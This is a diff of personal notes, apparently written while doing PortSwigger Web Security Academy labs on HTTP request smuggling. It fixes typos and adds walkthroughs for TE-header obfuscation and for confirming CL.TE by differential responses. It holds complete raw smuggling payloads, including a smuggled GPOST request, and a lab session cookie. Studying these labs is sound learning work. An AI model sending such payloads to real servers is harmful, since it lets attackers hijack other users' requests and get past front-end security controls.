@@ -88,7 +88,7 @@ abc\r\n
 X
 ```
 We get 500 Internal Server Error and the msg: "Server Error: Communication timed out"
-It happens because the frontend server used Content-Length header and assumed that `abc` is the end of the req.body and so it sended that req.body that ends with `abc` to the backend server.
+It happens because the frontend server used Content-Length header and assumed that `abc` is the end of the req.body and so it sent that req.body that ends with `abc` to the backend server.
 The backend server used Transfer-Encoding header which means `3` represents the chunk size (and the chunk is `abc`) but the next chunk size is absent. (If it was the last chunk size then instead of `3` we'd specify `0`)
 And since the next chunk size and next chunk are missing it could not finish processing the req, so it throwed 500 error and err: Timed out.
 
@@ -166,7 +166,7 @@ G\r\n
 \r\n
 ```
 First response is 200 and the second response: "Unrecognized method G0POST"
-Looks good, but the lab requires `GPOST` not and we got `G0POST`
+Looks good, but the lab requires `GPOST` and we got `G0POST`
 
 We can't just remove `0` from the end because `0\r\n\r\n` is the valid ending of `Transfer-Encoding: chunked` 
 If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the req body (which is `0\r\n\r\n`)
@@ -245,7 +245,7 @@ Content-Length: 5
 And then send `Attack req` and `Normal req` after it, from the server we'll get both 200 OK responses.
 
 It happens because `5` is the actual length of the req body of the `GPOST` req.
-Server will successfuly process the req body of the `GPOST` req and then will check that `GPOST` http method does not exist and it will throw an err, but we won't see that err. It'll happen in the background.
+Server will successfully process the req body of the `GPOST` req and then will check that `GPOST` http method does not exist and it will throw an err, but we won't see that err. It'll happen in the background.
 
 In other words `Attack req` will get 200 OK, response.
 Then `GPOST` req will fail behind the scenes
@@ -273,4 +273,193 @@ csrf=no436u5Fc1ZrQd1kaVlYUje5LkkTQM7H&postId=6&name=x&email=x%40x.com&website=ht
 0
 ```
 
+### PRACTITIONER Lab: HTTP request smuggling, obfuscating the TE header
+First we need to determine what the frontend server is using, TE or CL
+
+We send the req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+```
+Response 404 bad request and in the body:
+```bash
+{"error": "invalid request"}
+```
+This indicates that the frontend is using TE
+
+So we try to determine what the backend is using by sending the req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+X
+```
+We get 200 OK, which means the backend is using TE as well
+
+So we want to obfuscate TE header so that one of the servers falls back to processing CL header instead
+There are different techniques for TE obfuscation, right now we're using double TE header: when the second TE header has an invalid value
+
+So we try the following req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+Transfer-Encoding: foobar
+\r\n
+0\r\n
+\r\n
+X
+```
+And we see that the response is now timing out
+It happens because the frontend actually accepted the first TE header `Transfer-Encoding: chunked` and then the backend server tried to process `Transfer-Encoding: foobar` but failed and started using CL header instead
+
+So we now prepare 2 requests, normal and attack requests:
+Normal:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+\r\n
+foo=bar
+```
+
+Attack:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-Encoding: foobar
+\r\n
+1\r\n
+G\r\n
+0\r\n
+\r\n
+```
+
+So we send the attack req and the backend used CL header and therefore the backend is now poisoned with `G\r\n0\r\n\r\n`
+And now we send a normal req and we see: 403 Forbidden: Unrecognized method G0POST
+
+So now all we need to do is to change G0POST to GPOST to solve the lab
+
+Final attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: foobar
+\r\n
+5c\r\n
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+\r\n
+x=1\r\n
+0\r\n
+\r\n
+```
+
+`5c` is a hex value which indicates the length of the subsequent chunk, which is everything starting from GPOST up until but not including `\r\n0\r\n\r\n`
+
+And normal req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+\r\n
+foo=bar
+```
+
+So now we send our attack req, and normal req
+and we get back: Unrecognized method GPOST
+
+In burp don't forget to downgrage to http1: Inspector > req attributes > http1
+And also in burp disable Update content length
+
+### PRACTITIONER Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+Let's first try:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+```
+When we send that request we don't get a response right away and eventually it times out
+This is a strong indication that the frontend server is using CL and the backend is using TE
+
+To confirm CL TE that we'll use differential responses:
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+GET /whateverDoesntExist HTTP/1.1\r\n
+X-Ignore: X
+```
+**Make sure there is no `\r\n` after `X-Ignore: X` because we want our normal request to be prepended without `\r\n`, i.e. we want it to be right after the `X` e.g.:**
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+GET /whateverDoesntExist HTTP/1.1\r\n
+X-Ignore: XGET / HTTP/1.1
+Host: ...
+Cookie: ...
+```
+
+About X-Ignore header:
+It is not the header in the smuggled request that is important, as such, it is the fact that the last two lines of the request are treated by the back-end server as belonging to a new request, which subsequently causes issues. You can use anything here in order to elicit the same outcome, as shown in the screenshot below:
+
+Normal req is copied from burp's http history and only http method is changed from http2 to http 1.1, everything else stays the same:
+```bash
+GET / HTTP/1.1
+Host: 0a49009503a6129d80246c0e008d00de.web-security-academy.net
+Cookie: session=uY2znmVLLpVx8UwJ1beDTDH6lKQk2KoK
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
 
